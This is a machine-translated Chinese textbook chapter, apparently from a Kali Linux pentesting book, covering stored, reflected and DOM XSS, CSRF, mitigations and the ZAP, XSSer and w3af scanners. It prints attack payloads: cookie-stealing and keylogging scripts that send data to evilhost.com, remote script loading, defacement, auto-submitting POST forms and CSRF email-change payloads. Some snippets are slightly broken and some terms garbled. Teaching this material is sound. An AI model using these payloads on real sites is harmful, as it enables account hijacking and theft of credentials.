# 十六、通过 XSS 和 CSRF 漏洞利用客户端

在这个 Web2.0 时代，越来越多的组织正在利用丰富的在线应用。这些应用是为电子商务业务、银行交易、股票交易、存储医疗记录等而设计的。为了提供丰富的用户体验，应用与用户交互，并存储使用该应用的用户的敏感个人信息。从安全角度来看，这些应用的利用人员需要采取必要的措施来保护应用并维护敏感数据的完整性。

当应用依赖于用户输入时，主要的问题是它不能信任最终用户提供非恶意数据。用户可以使用脚本代替用户名，应用负责决定该参数的合法数据输入。当无法清理输入时，攻击者可以利用此条件执行脚本攻击。

在本章中，我们将讨论跨站点脚本攻击和跨站点请求伪造攻击。当利用这两个缺陷时，攻击者不会直接以最终用户为目标；相反，他们利用受害者访问的网站上的漏洞。一旦网站被注入恶意脚本，该网站就会无意中感染访问该网站的所有用户。

本章将介绍以下主题：

*   跨站点脚本的起源
*   跨站点脚本攻击概述
*   跨站点脚本的类型
*   XSS 和 JavaScript
*   XSS 工具
*   跨站请求伪造

# 跨站点脚本的起源

你经常会听到同时使用跨站点脚本和 JavaScript 这两个术语。JavaScript 是 Netscape 在 1995 年推出的一种客户端脚本语言。JavaScript 的主要目的是让 web 浏览器在客户端执行一些任务。尽管 JavaScript 也可用于其他目的，但它在 web 浏览器中最常用于实现客户端脚本，可用于更改浏览器上显示的网页，例如，当用户输入错误值时显示弹出错误消息对话框或在网页上显示广告。

一些黑客很快发现，使用 JavaScript，他们可以从相邻窗口或框架中加载的网页读取数据。因此，恶意网站可能跨越边界，与加载在与其域无关的完全不同的网页上的内容进行交互。这种技巧被称为跨站点脚本攻击。为了阻止这种攻击，Netscape 引入了同源策略，根据该策略，web 浏览器允许一个网页中加载的 JavaScript 仅访问来自同一域的其他网页。换句话说，恶意用户不能使用 JavaScript 从任意网页读取数据。

在 2000 年初，跨站点脚本攻击因使网页在 web 浏览器中加载恶意脚本而变得更加著名，而不是从相邻帧中加载的网页中读取内容。尽管跨站点脚本攻击的目的多年来有所改变，但名称仍然不变，因此一些人对它为什么被称为跨站点脚本感到困惑。多年来，跨脚本攻击一直使用 JavaScript 执行恶意活动，如恶意登录、端口扫描和密钥记录。

XSS 攻击还可用于将 VBScript、ActiveX 或 Flash 注入易受攻击的网页。由于 JavaScript 被广泛使用，我们也将在本章中仅使用 JavaScript 来演示示例。

## JavaScript 简介

为了让事情更清楚，JavaScript 不同于 Java 编程语言。Netscape 将其命名为 JavaScript 纯粹是出于营销原因，因为 Java 编程语言在这段时间内越来越流行。在动态 web 应用中，JavaScript 用于各种各样的任务，可以嵌入 HTML 页面中，从多个源检索数据以构建 web 页面。一个简单的例子是一个社交网站，它使用 JavaScript 通过从多个位置加载个人资料图像、用户详细信息和旧帖子来构建个人资料页面。在 HTML 代码中使用 JavaScript 的一些方式如下所示：

*   **脚本标签**：JavaScript 可以通过<`script>`标签直接嵌入到网页中。命令如下：

    ```
    <script> alert("XSSed"); </script>
    ```

*   **Body 标签**：也可以使用`<body>`标签中的 onload 事件嵌入脚本。命令如下：

    ```
    <body onload=alert("XSSed")>
    ```

*   **图像标签**：该标签可用于执行 JavaScript，该 JavaScript 通常用于恶意目的。命令如下：

    ```
    <img src="javascript:alert('XSS');">
    ```

其他标记，如`<iframe>`、`<div>`和`<link>`也用于在 HTML 页面中嵌入脚本。

JavaScript 不仅可以从服务器检索信息，还可以执行**文档对象模型**（**DOM**脚本，并可以访问 web 浏览器数据和操作系统属性。JavaScript 被设计为在一个非常受限的环境中运行，对底层操作系统的访问有限，但即使访问有限，web 浏览器中加载的 JavaScript 也可以用来做一些令人讨厌的事情。

当 JavaScript 加载到浏览器中时，它可以访问分配给用户会话的 cookie 并访问 URL 历史记录。Cookie 通常用作会话标识符。如果攻击者可以窃取它们，他们就可以控制会话。另外，JavaScript 可以访问网页的整个 DOM，并可以修改 HTML 页面，这可能导致网页损坏。使用模糊的 JavaScript，对于一个普通的浏览者来说，理解 JavaScript 到底在做什么变得更加困难。

### 注

DOM 是一种逻辑结构，它定义了属性以及 web 页面中对象（文本、图像、标题或链接）的表示方式。它还定义了操作它们的规则。

# 跨站点脚本概述

简单来说，跨站点脚本攻击允许攻击者在其他用户的浏览器中执行恶意 JavaScript。恶意脚本通过易受 XSS 攻击的网站传送到客户端。在客户端上，web 浏览器将脚本视为网站的合法部分并执行它。当它在受害者的浏览器中运行时，脚本可以强制浏览器执行与用户可以执行的操作类似的操作。该脚本还可以使浏览器执行欺诈交易、窃取 cookie 或将浏览器重定向到其他网站。

XSS 攻击通常涉及以下参与者：

*   正在执行攻击的攻击者
*   易受攻击的 web 应用
*   受害者使用网络浏览器
*   攻击者希望通过受害者重定向浏览器或进行攻击的第三方网站

让我们看一个攻击者执行 XSS 攻击的示例：

1.  The attacker first tests the various input fields for the XSS flaw using legitimate data. Input fields that reflect the data back to the browser could be candidate for a XSS flaw. An example is shown in the following screenshot; the website passes the input using the `GET` method and displays it back to the browser:

    ![An overview of cross-site scripting](../Images/image01162.jpeg)

2.  一旦攻击者发现要注入的参数没有进行足够的输入验证，他们就必须设计一种方法将包含 JavaScript 的恶意 URL 传递给受害者。攻击者可以使用电子邮件作为传递机制，或者通过网络钓鱼攻击诱使受害者查看电子邮件。
3.  The e-mail would contain a URL to the vulnerable web application along with the injected JavaScript. When the victim clicks on it, the browser parses the URL and also sends the JavaScript to the website. The input in the form of JavaScript is reflected to browser. As an example, I am using a benign JavaScript: `<script>alert('Pwned!!')</script>`.

    完整的 URL 如下所示：

    ```
    http://example.org/hello.php?name=<script>alert('Pwned!!')</script>
    ```

4.  `alert`方法通常用于演示和测试应用是否易受攻击。在本章后面的部分中，我们将探讨攻击者经常使用的其他 JavaScript 方法。
5.  If the web application is vulnerable, a dialog box will pop up on the victim's browser, as shown in the following screenshot:

    ![An overview of cross-site scripting](../Images/image01163.jpeg)

# 跨站点脚本的类型

XSS 的主要目的是在受害者的浏览器上执行 JavaScript，但根据网站的设计和目的，有不同的实现方式。XSS 有三大类：

*   持久 XSS
*   脚本漏洞
*   domxss

## 持续性 XSS

这种形式的跨站点脚本也称为存储 XSS。当注入的数据存储在 Web 服务器或服务器端的数据库上，并且应用将其返回给用户而无需验证时，XSS 缺陷称为持久 XSS。如果攻击者的目标是感染网站的每一位访问者，他将使用持续的 XSS 攻击，这将使他或她能够大规模利用该网站。

持久 XSS 缺陷的典型目标如下：

*   基于 Web 的讨论论坛
*   社交网站
*   新闻网站

持久 XSS 被认为比其他 XSS 缺陷更严重，因为攻击者的恶意脚本会自动注入受害者的浏览器。这不需要网络钓鱼攻击来引诱用户点击链接。攻击者将恶意脚本上传到易受攻击的网站，并在正常浏览活动中发送到受害者的浏览器。在持久 XSS 中，您还可以直接从远程服务器导入 JavaScript 文件。注入时，以下代码将查询远程服务器以执行 JavaScript：

```
<script type="text/javascript" src=http://evil.store/malicious.js></script>
```

下图显示了易受持久 XSS 攻击的 web 应用的示例。该应用是一个在线论坛，用户可以在其中创建帐户并与其他人进行交互。应用将用户配置文件与其他详细信息一起存储在数据库中。攻击者发现应用未能清理 comments 部分中提供的数据，并利用此机会在该字段中添加恶意 JavaScript。此 JavaScript 存储在 web 应用的数据库中。在正常浏览期间，当无辜的受害者查看这些评论时，JavaScript 会在受害者的浏览器上执行，该浏览器会抓取 cookie 并将其发送到攻击者控制下的远程服务器：

![Persistent XSS](../Images/image01164.jpeg)

## 反射 XSS

反射 XSS 也被称为非持久 XSS。在这种形式的攻击中，恶意脚本是受害者对 web 应用请求的一部分，应用会以响应的形式将其反映出来。这看起来很难利用，因为用户不愿意向服务器发送恶意脚本，但有几种方法可以欺骗用户对其自己的浏览器发起反射 XSS 攻击。

反射 XSS 主要用于黑客部署包含恶意脚本和 URL 的钓鱼电子邮件的定向攻击，或者攻击可能涉及在公共网站上发布链接并诱使用户单击。这些方法，再加上缩短 URL 并隐藏长而奇怪的脚本的 URL 缩短服务，会在受害者的脑海中引起怀疑，可以用来执行反射 XSS 攻击，并取得巨大成功。

如下图所示，受害者被诱骗单击一个 URL，该 URL 将脚本传递给应用，然后在未经适当验证的情况下将其反射回来：

![Reflected XSS](../Images/image01165.jpeg)

## 基于 DOM 的 XSS

第三种类型的跨站点脚本是本地的，直接影响受害者的浏览器。此攻击不依赖发送到服务器的恶意内容。在持久和反射的 XSS 中，脚本包含在服务器的响应中。受害者的浏览器接受它，假设它是网页的合法部分，并在页面加载时执行它。在基于 DOM 的 XSS 中，只执行服务器提供的合法脚本。

越来越多的 HTML 页面是通过在客户端下载 JavaScript 而不是通过服务器生成的。任何时候在不刷新整个页面的情况下更改页面的某个元素时，都会使用 JavaScript 完成。一个典型的例子是提供板球比赛实时更新的网站，定期刷新比分部分。

基于 DOM 的 XSS 利用这种合法的客户端代码执行脚本攻击。基于 DOM 的 XSS 最重要的部分是，合法脚本使用用户提供的输入向用户浏览器上显示的网页添加 HTML 内容。

让我们讨论一个基于 DOM 的 XSS 示例：

1.  假设创建了一个网页，根据 URL 中传递的城市名称显示自定义内容。URL 中的城市名称也会显示在用户浏览器的 HTML 网页中，如下所示：

    ```
    http://www.cityguide.com/index.html?city=Mumbai
    ```

2.  当浏览器接收到前面的 URL 时，它向`http://www.cityguide.com`发送请求以接收网页。在用户的浏览器上，下载并运行合法的 JavaScript，它编辑 HTML 页面，将城市名称添加到加载页面的顶部作为标题。城市名称取自 URL（在本例中为`Mumbai`）。因此，城市名称是用户可以控制的参数。
3.  As discussed earlier, the malicious script in DOM-based XSS is not sent to the server. To achieve this, the `#` sign is used to prevent any content after the sign from being sent to the server. Therefore, the server-side code has no access to it even though the client-side code can access it.

    恶意 URL 可能如下所示：

    ```
    http://www.cityguide.com/index.html?#city=<script>function</script>
    ```

4.  加载页面时，浏览器点击合法脚本，该脚本使用 URL 中的城市名称生成 HTML 内容。在这种情况下，合法脚本遇到恶意脚本并将脚本写入 HTML 正文，而不是城市名称。当呈现网页时，脚本被执行，导致基于 DOM 的 XSS 攻击。

下图显示了基于 DOM 的 XSS 的示例：

![DOM-based XSS](../Images/image01166.jpeg)

### 防御基于 DOM 的 XSS

由于基于 DOM 的 XSS 中的恶意负载没有击中服务器，因此无法使用服务器端验证技术检测到它。应用的编程方式仍然存在问题，但故障在于客户端代码。关键的防御方法之一是避免使用客户端数据构建 HTML 页面。

有时，避免用户在客户端代码中输入是不可能的，因此针对基于 DOM 的 XSS 的最佳防御措施是避免使用危险的 HTML 和 JavaScript 方法。

应极其小心地使用以下方法：

*   `document.write()`：

    ```
    document.write('City name='+userinput);
    ```

*   `element.innerHTML`：

    ```
    element.innerHTML='<div>'+userinput +'</div>';
    ```

*   `eval`；

    ```
    var UserInput="'Mumbai';alert(x);";
    eval("document.forms[0]."+"Cityname="+txtUserInput);
    ```

除此之外，您还可以在客户端代码中使用用户输入之前对其进行编码。使用字符串分隔符和将用户数据包装到自定义函数中是其他防御方法。一些 JavaScript 框架还具有针对基于 DOM 的攻击的内置保护。

### 注

编码是一个术语，用于描述用户输入的转义，这将使浏览器将其解释为仅数据而非代码。例如，将`< and >`等字符转换为`&lt;`和`&gt;`。

## XSS 使用 POST 方法

在我们讨论的反射 XSS 示例中，我们使用了`GET`方法。这使得攻击者很容易注入数据，因为它只需要用脚本构造一个自定义 URL，并诱使用户点击它。当网页使用`POST`方法传递输入时，利用 XSS 缺陷需要额外的步骤。

使用`POST`方法，攻击者将无法直接注入脚本，因为 URL 中没有传递输入。攻击者必须想出一种间接的方法来注入脚本。下面的示例将描述该过程。

假设网页上的搜索功能容易受到 XSS 漏洞的攻击，并且当攻击者在该网页上的搜索框中插入脚本时，该脚本会在未经清理的情况下反射回来。HTML 页面的示例代码如下所示：

```
<html>
  <body>
    <form name="query" method="post" action="/search.php">
      <input type="text" name="search_input" value="">
      <input type="submit" value="submit">
    </form>
    </body>
</html>
```

使用`POST`方法执行 XSS 的一种方法是诱骗用户填写攻击者页面上的某些表单，并让他们单击提交按钮。然后，攻击者的网站将用户转移到易受攻击的网站，用恶意脚本替换用户输入。

试图欺骗用户在攻击者的网站上填写表单最有可能失败，并且只有在极少数情况下才会成功。因此，我们需要通过将恶意脚本和针对易受攻击应用的`POST`请求直接嵌入攻击者控制下的网页来实现自动化。让我们讨论这样一个页面的示例。攻击者控制的网站位于[http://www.evilattacker.com](http://www.evilattacker.com) ，加载易受攻击的网页`http://www.xssvulnerable.org/search.php`。一旦`evilattacker.com`网站打开，执行`onload`功能，浏览器向有漏洞的网站发送一个`POST HTTP`请求，该请求带有嵌入的有效负载，而受害者无需点击提交按钮。代码如下：

```
<html>
<head>
  <body onload="evilsearch.submit();">
    <form method="post" action="http://www.xssvulnerable.org/search.php" name="evilsearch" >
      <input name="search_input" value="<SCRIPT>alert('XSS')</SCRIPT>">
      <input type="submit" class="button" name="submit">
    </form>
  </body>
</html>
```

使用此方法，攻击者不必让用户填写任何表单，只需诱骗用户访问其控制下的网页即可。

# XSS 和 JavaScript——致命的组合

黑客在利用 XSS 漏洞时非常有创意，在 JavaScript 的帮助下，攻击可能性增加。XSS 结合 JavaScript 可用于以下类型的攻击：

*   帐号劫持
*   更改内容
*   污损完整的网站
*   从受害者的机器上运行端口扫描
*   记录按键笔划
*   窃取浏览器信息

让我们讨论几个例子。

## 偷饼干

在每一次关于 XSS 攻击的讨论中，我们谈论的第一件事是如何使用 XSS 和 JavaScript 来破坏 cookie。在会话期间，攻击者可以使用被盗的 cookie 来模拟受害者，直到用户注销应用。

HTML DOM 的`document.cookie`属性返回分配给当前会话的所有 cookie 的值。例如，攻击者可以将以下脚本插入易受 XSS 攻击的网站的评论部分：

```
<script language="Javascript">
  Document.location='http://www.evilhost.com/cookielogger.php?cookie= '+document.cookie;
</script>
```

当用户查看网页时，也会下载评论。这包括前面的脚本，该脚本将在攻击者的控制下将 cookie 发送到`evilhost.com`服务器。

### 提示

如果设置了`HttpOnly`标志（可选 cookie 标志），JavaScript 将无法访问 cookie。

## 键盘记录器

攻击者还可以通过注入 JavaScript 收集受害者的所有击键，JavaScript 将记录用户类型的所有信息，如密码、信用卡号等，然后将其发送到他或她控制的服务器。

此处显示了记录所有击键的示例脚本：

```
<script>
  document.onkeypress = function(e)
  var img = new Image();
  img.src='http://www.evilhost.com/keylogger.php?data='+e.which;
</script>
```

每当用户按键时，`onkeypress`事件被触发。在前面的脚本中，为每个按下的键创建一个名为`e`的对象。`which`关键字是对象`e`的一个属性，它存储被按下的键的键代码。

## 网站污损

网站污损是对网站的一种攻击，它会改变网站的视觉外观。这些攻击大多是由黑客活动主义者实施的，他们想宣传自己的议程。`document.body.innerHTML`属性允许 JavaScript 操作加载的 HTML 页面的内容。此功能是为合法目的而创建的，但与其他功能一样，攻击者也可以使用此功能进行恶意攻击，在这种情况下，它被用来破坏网页。

通过注入以下脚本，当前页面的内容将替换为`THIS WEBSITE IS UNDER ATTACK`文本：

```
<script>
  document.body.innerHTML="<div style=visibility:visible;><h1>THIS WEBSITE IS UNDER ATTACK</h1></div>";
</script>
```

# 扫描 XSS 缺陷

Kali Linux 有多种工具可用于自动化 XSS 缺陷的测试。更繁琐但更准确的方法是使用手动测试方法，即使用代理拦截 HTTP 请求，操作每个字段，并用有效负载替换它。

应用每天都变得越来越复杂，越来越多的用户可编辑字段使得手动测试非常困难，因为测试人员可能会忽略一个易受攻击的参数。当您想要广泛测试特定参数时，手动测试非常有用。从攻击者的角度来看，自动化识别易受攻击参数的任务可以缩短利用最终攻击的时间。Kali Linux 有几种自动扫描 XSS 缺陷的工具，我们将在本节中讨论这些工具：

*   OWASP 加密攻击代理
*   XSSer
*   W3Af

## Zed 攻击代理

**Zed 攻击代理****ZAP**是 OWASP 维护的开源 web 应用渗透测试工具。这是帕罗斯代理的一个分支。Kali Linux 2.0 附带的版本是 2.4.1。ZAP 的主要特点如下：

*   拦截代理
*   主动和被动扫描器
*   暴力强迫
*   起毛
*   支持多种安全语言

ZAP 默认作为被动代理工作；除非您在要截获请求和响应的 URL 上设置断点，否则它不会主动截获流量。ZAP 位于**应用****Web 应用分析**

我们使用 ZAP 的背后的目的是识别 web 应用中的 XSS 缺陷。与任何其他代理类似，您需要首先配置 web 浏览器，以便通过它对流量进行隧道传输。您可以手动配置浏览器或安装一个名为 FoxyProxy for Firefox 的代理插件工具，这需要初始配置。配置加载项后，只需从下拉菜单中选择代理设置，如以下屏幕截图所示：

![Zed Attack Proxy](../Images/image01167.jpeg)

ZAP 是一种通用的 web 应用渗透测试工具。在“网站”窗口的左上角，会记录您访问的所有网站。当您浏览网站时，ZAP 会在后台执行被动扫描，并尝试通过对网站进行爬网来识别漏洞。

它检查 HTTP 请求和响应，并确定是否存在缺陷的可能性。检测到的漏洞显示在底部窗口的**警报**选项卡中。如下图所示，它发现了未设置`HTTPOnly`标志的 Cookie：

![Zed Attack Proxy](../Images/image01168.jpeg)

### 范围界定和选择模式

浏览器配置 ZAP 后，会在左侧站点窗口中显示所有网站。在渗透测试期间，识别特定目标变得非常重要，因此您需要定义范围内的站点。右键点击您感兴趣的 URL，点击**包含在上下文**中，选择**新建上下文**为该 URL 创建一个新范围。作用域为的 URL 将显示目标图标：

![Scoping and selecting modes](../Images/image01169.jpeg)

如果网站使用基于表单的身份验证，并且要求用户在查看内容之前登录，则必须将执行身份验证的 URL 标记为**基于表单的身份验证登录请求**，如下图所示：

![Scoping and selecting modes](../Images/image01170.jpeg)

在配置窗口中，选择**认证**选项，配置用户名和密码参数。在**用户**选项中，定义用户名和密码，并在**强制用户**选项中选择该用户：

![Scoping and selecting modes](../Images/image01171.jpeg)

一旦配置了三个选项，主窗口上的**强制用户模式**选项将被启用：

![Scoping and selecting modes](../Images/image01172.jpeg)

当启用**强制用户模式**选项时，通过 ZAP 发送的每个请求都会自动进行身份验证。如果用户在扫描期间注销，它将在无需您干预的情况下重新验证该用户。

### 操作模式

有几种模式可供您配置 ZAP。在窗口的左上角，您将看到一个下拉框，其中有三种模式：

*   **安全模式**：在**安全模式**下，ZAP 不会执行任何侵入性扫描，只会像被动扫描仪一样工作，试图识别目录浏览和信息泄漏缺陷等低挂果实。它不会主动与应用交互，因此无法识别严重的漏洞，例如 XSS 漏洞。
*   **保护模式**：选择**保护模式**时，可以对范围内定义的 URL 使用主动扫描技术。
*   **标准模式**：在此模式下，无论 URL 是否在范围内，您都可以执行所有攻击性扫描。

### 扫描策略和攻击

ZAP 可以用来测试的所有主要漏洞，但我们将专门使用它来测试 XSS 的应用。为此，我们必须定义一个扫描策略，将 XSS 规则配置为活动扫描的一部分。

在顶部，您将看到一个名为**分析**的菜单，并选择其下方的**扫描策略**。这将打开配置窗口。对于每个测试名称，您都会发现一个**阈值**和**强度**选项：

![Scan policy and attack](../Images/image01173.jpeg)

下面的详细解释了这些选项

*   **阈值**：**阈值**选项控制测试识别的漏洞的可靠性。如果选择**低**，则误报的数量会增加。如果选择**高**，则识别的漏洞会更少。误报率会降低，但也可能会漏掉一些缺陷。您需要在两者之间保持平衡，并选择“中等”选项。
*   **强度**：控制 ZAP 为确认缺陷存在而进行的测试次数。选择**低**将使 ZAP 以较少的有效载荷测试缺陷，测试将更快完成。如果选择**高**，则会使用更多的攻击方法。这也会增加完成测试所需的时间。顾名思义，**疯狂**选项会发送大量攻击，应该在实验室或受控环境中使用。

要为 XSS 配置策略，请为策略指定一个名称，并禁用左侧的所有测试，但注入下的跨站点脚本（持久）和跨站点脚本（反射）除外。如果您想以后再使用，请单击**保存策略**。然后，右键点击目标 URL，进入**攻击****活动扫描范围**。

然后，ZAP 将运行 magic，并在底部窗口的**警报**选项卡下通知任何 XSS 漏洞（如果已识别）。如果选择该警报，ZAP 将显示发送到触发该漏洞的服务器的确切 HTTP 请求。如以下屏幕截图所示，在 author 参数中插入了一个脚本：

![Scan policy and attack](../Images/image01174.jpeg)

## Xsser

跨站点脚本程序（Xsser）是一种自动检测和利用 XSS 漏洞的工具。Kali Linux 附带的版本是 1.6（测试版）。Xsser 还包含几个选项，可以绕过利用人员实现的输入验证过滤器。

### 特征

下面列出了 Xsser 的一些重要特性：

*   命令行工具和图形界面
*   显示攻击的详细统计信息
*   同时使用`GET`和`POST`方法注射
*   为需要身份验证的站点包含 cookie 的选项
*   定制各种 HTTP 头字段，如**推荐人**和**用户代理**
*   包括各种滤波器旁路技术，如采用十进制和十六进制编码的和利用`unescape()`函数

xsser 的**图形用户界面**（**GUI**）可以通过`–gtk`选项直接从外壳启动。GUI 还为新用户提供了一个向导，可以询问一些问题并创建一个模板。根据测试需要选择各种选项后，单击**Aim**并让工具完成其余操作：

![Features](../Images/image01175.jpeg)

### 注

Gtk 代表 Gimp 工具包，程序员使用它为他们的程序制作图形界面。

更有经验的黑客会对命令行界面感到满意。运行`xsser –help`查看工具支持的不同选项。下表显示了重要的命令行选项：

<colgroup><col> <col></colgroup> 
| 

选项

 | 

使用

 |
| --- | --- |
| `-u` | 这用于指定目标 URL |
| `-g` | 用于在指定的`GET`参数中注入脚本 |
| `-p` | 用于在指定的`POST`参数中注入脚本 |
| `--heuristic` | 这将尝试识别应用过滤的字符 |
| `--cookie` | 这将为 HTTP 请求设置 cookie |
| `-s –v` | 这些选项将显示统计信息和详细输出。 |

Xsser 是一个高级工具，除了表中列出的选项外，还包括许多其他选项，但是这些选项应该有助于您开始使用该工具。

在下面的示例中，我们将测试易受攻击的 web 应用是否存在跨站点脚本缺陷。应用需要身份验证，一旦通过身份验证，它将设置一个 cookie 来在进一步的交互中标识用户。使用`–cookie`选项在请求中传递 cookie。待测参数通过`–g`选项传递，与`GET`方法相同：

```
xsser -u "http://192.168.1.72/dvwa/vulnerabilities/" -g "xss_r/?name=" --cookie="security=low; PHPSESSID=n78lph8ojlp0khpli1ms3s73h5" -s –v
```

xsser 设置的各种默认选项也显示在输出中，因为我们选择了**版本**选项。然后，Xsser 注入参数，并尝试确定该参数是否易受 XSS 攻击，如以下屏幕截图所示：

![Features](../Images/image01176.jpeg)

## W3af

Kali Linux 中另一个有趣的工具是 web 应用审计和攻击框架工具，缩写为 w3af。它之所以被称为框架，是因为它的功能非常丰富。它是一个菜单驱动的工具；它包括节省时间和有用的功能，例如类似于 Metasploit 的自动完成功能，并包含各种插件。

w3af 的 web 应用负载特性是一个需要特别提及的特性。利用 web 应用漏洞并通过上载有效负载来访问目标机器一直是一项困难的任务。W3af 包括使利用阶段更容易的插件，还与 Metasploit 集成，从而允许它在目标机器上上载 Metasploit 负载，并将其用于后期利用。

### 插件

w3af 中的插件分为几类，主要插件如下：

*   **爬网**：这些插件用于爬网目的，任务是识别新的 URL。他们确定了其他插件可以使用的新注入点。
*   **审计**：审计插件使用爬网插件识别的注入点，测试漏洞。
*   **Grep**：Grep 插件用于识别低挂果实，如错误页面、注释、HTTP 头和其他信息泄漏缺陷。通过分析请求和响应来嗅探此信息。
*   **基础设施**：用于对目标服务器进行指纹识别并识别操作系统、数据库版本和 DNS 相关信息的插件属于信息插件。
*   **输出**：这些插件定义结果的输出格式。
*   **身份验证**：对于需要身份验证的 web 应用，此插件提供预定义的用户名和密码，自动向应用进行身份验证。

w3af 工具位于**应用****Web 应用分析**。或者，您可以通过在 shell 提示符中键入`w3af_console`来启动命令行工具。当提示返回时，输入`help`检查可用的命令：

![Plugins](../Images/image01177.jpeg)

要查找所有不同类别的插件，请依次输入`plugins`和`help`。要浏览每个类别下可用的各种插件，请键入插件类别，例如，`audit`，如以下屏幕截图所示：

![Plugins](../Images/image01178.jpeg)

要配置每个插件以供使用，请键入您感兴趣的插件的类别名称和前几个字符，然后按*选项卡*键。

### 图形界面

为了演示 XSS 漏洞的测试，我们将使用 w3af GUI。W3af 包括几个预定义的概要文件，这些概要文件是通过选择各个插件并将它们组合到一个包中创建的。例如，如果要针对 OWASP 列出的前 10 个 web 应用漏洞测试 URL，可以选择**OWASP_TOP10**配置文件：

![Graphical interface](../Images/image01179.jpeg)

为了测试 XSS 漏洞的 URL，我们需要选择**审计**类别下的 XSS 插件。如果您正在测试持久性 XSS 缺陷，请选择屏幕底部的**持久性 XSS**选项。接下来，指定目标 URL 并点击**开始**：

![Graphical interface](../Images/image01180.jpeg)

**日志**窗口将显示检测到的 XSS 缺陷，并使用映射到发送到目标应用的单个请求的请求 ID 对其进行标识。扫描状态也显示在此处：

![Graphical interface](../Images/image01181.jpeg)

如果要检查触发该漏洞的实际请求和响应，请导航到**结果**窗口。请求和响应的标题和正文都显示在此窗口中。在此示例中，发现页面参数易受攻击：

![Graphical interface](../Images/image01182.jpeg)

# 跨站点请求伪造

**跨站点请求伪造**（**CSRF**经常被混淆为类似 XSS 的漏洞。XSS 利用用户对特定站点的信任，使用户执行网站提供的任何数据。另一方面，CSRF 利用网站在用户浏览器中的信任，使网站执行来自已验证会话的任何请求，而无需验证用户是否希望执行该操作。

在 CSRF 攻击中，攻击者利用用户已通过应用身份验证的事实，客户端发送的任何内容都将被服务器视为合法操作。

如果没有实施足够的防御，CSRF 可以利用每个需要在经过身份验证的会话中发出单个请求的 web 应用功能。以下是攻击者通过 CSRF 攻击执行的一些操作：

*   在 web 应用中更改用户详细信息，如电子邮件地址和出生日期
*   进行欺诈性银行交易
*   网站上的欺诈性向上投票和向下投票
*   在电子商务网站上用户不知情的情况下在购物车中添加项目

## 攻击依赖性

成功利用 CSRF 缺陷取决于几个变量：

*   由于 CSRF 利用经过身份验证的会话，因此受害者必须具有针对目标 web 应用的活动身份验证会话。应用还应允许会话内的事务，而无需重新验证。
*   CSRF 是一种盲攻击，目标 web 应用的响应不会发送给攻击者，而是发送给受害者。攻击者必须了解网站上会触发预期操作的参数。例如，如果您想更改网站上受害者的注册电子邮件地址，作为攻击者，您必须确定进行更改所需的确切参数。因此，攻击者需要正确理解 web 应用，这可以通过直接与 web 应用交互来实现。
*   如果目标应用正在使用`POST`方法，则攻击者需要找到一种方法来欺骗用户单击预构造的 URL 或访问攻击者控制的网站。这可以通过使用社会工程攻击来实现。

## 攻击方法

上一节讨论的攻击依赖关系的第三点要求受害者浏览器在受害者不知情的情况下向目标应用提交请求。可以通过以下几种方式实现：

*   Image tag is one the most common way to achieve it and is often used to demonstrate a CSRF vulnerability. The attack methodology would be the attacker tricking the victim to visit a website under his or her control. A small image is loaded on that website, which would be performing the fraudulent transaction on behalf of the victim. The following code is one such example:

    ```
    <imgsrc=http://vulnerableapp.com/userinfo/edit.php?email=evil@attacker.com height="1" width="1"/>
    ```

    图像的高度和宽度设置为仅 1 个像素；因此，即使图像源不是合法图像，受害者也无法识别它。应用中用户的电子邮件地址更新为`evil@attacker.com`。此技术仅适用于`GET`请求。

*   使用 script 标记也可以使用相同的技术。当邪恶网站加载到用户浏览器上时，脚本将执行，并在幕后执行事务。
*   对于使用`POST`方法的网站来说，步骤更为困难。攻击者必须使用隐藏的 Iframe 并在其中加载表单，从而在易受攻击的 web 应用上执行所需的功能。此处举例说明：

    ```
    <iframe style=visibility:"hidden" name="csrf-frame" ></iframe>
    <form name="csrf" action=""http://vulnerableapp/userinfo/edit.php" method="POST" target="csrf-frame"
    <input type="hidden" name="email" value="evil@attacker.com">
    <input type='submit' value='submit'>
    </form>
    <script>document.csrf.submit();</script>
    ```

### 提示

CSRF 也称为会话骑乘攻击。

许多人在读到攻击者的网站向不在其域内的其他网站提交表单时感到困惑。请记住，本章的*跨站点脚本概述*一节中讨论了同源策略，以及 XSS 是如何产生这种策略的。需要记住的一个非常重要的点是，同源策略不会阻止浏览器跨域提交表单。它只阻止脚本跨域访问数据。

## CSRF 缺陷测试

对 CSRF 漏洞的描述清楚地表明这是一个业务逻辑缺陷。有经验的利用人员将创建 web 应用，在执行关键任务（如更改密码、更新个人详细信息）或在金融应用（如在线银行帐户）中做出关键决策时，始终在屏幕上与用户确认。测试业务逻辑缺陷不是自动化 web 应用扫描器的工作，而是他们在预定义规则上的工作。例如，大多数自动扫描器测试以下内容，以确认 URL 中是否存在 CSRF 缺陷：

*   检查请求和响应中的常见反 CSRF 令牌名称
*   试图通过提供虚假的推荐人来推断应用是否正在检查推荐人字段
*   创建变体以检查应用是否正确验证令牌值
*   检查查询字符串中的标记和可编辑参数

大多数自动化应用扫描仪使用的所有上述方法都容易出现误报和漏报。应用将使用完全不同的缓解技术来击败 CSRF 攻击，从而使这些扫描工具变得无用。

分析应用是否存在 CSRF 缺陷的最佳方法是首先全面了解 web 应用的功能。启动代理，如 Burp 或 ZAP，并捕获流量以分析请求和响应。然后，您可以创建一个 HTML 页面，复制从代理中识别的易受攻击代码。测试 CSRF 缺陷的最佳方法是手动进行。

OWASP 的优秀人员试图通过 OWASP CSRFTester 项目简化手动测试。以下是使用该工具的步骤：

1.  从[下载工具 https://www.owasp.org/index.php/Category:OWASP_CSRFTester_Project](https://www.owasp.org/index.php/Category:OWASP_CSRFTester_Project) 。该工具的说明在同一页上提供。
2.  使用该工具的内置代理功能记录要测试 CSRF 的事务。
3.  使用捕获的数据，编辑您怀疑易受 CSRF 攻击的参数及其值。
4.  然后，CSRFtester 工具将创建一个 HTML 文件。使用此 HTML 文件使用前面讨论的方法构建攻击。

pinata csrf 工具托管于[https://code.google.com/p/pinata-csrf-tool/](https://code.google.com/p/pinata-csrf-tool/) 是我们经常使用的另一个工具，用于为 CSRF 缺陷创建 POC。

## CSRF 缓解技术

在这里，我们将讨论一些针对 CSRF 攻击的缓解技术：

1.  当脆弱参数通过`GET`方法传递时，CSRF 攻击更容易执行。因此，首先要避免，尽可能使用`POST`方法。它不能完全缓解攻击，但会使攻击者的任务变得困难。
2.  在我们讨论的攻击方法中，攻击者创建一个新网页并在其中嵌入 HTML 表单，向易受攻击的应用发送请求。每当客户端被定向到特定页面时，浏览器就会发送 HTTP Referer。如果应用设计为检查**HTTP referer**字段，那么它可能是一种有用的防御措施，因为它会断开连接，因为它不是由同一域中的 URL 引用的。
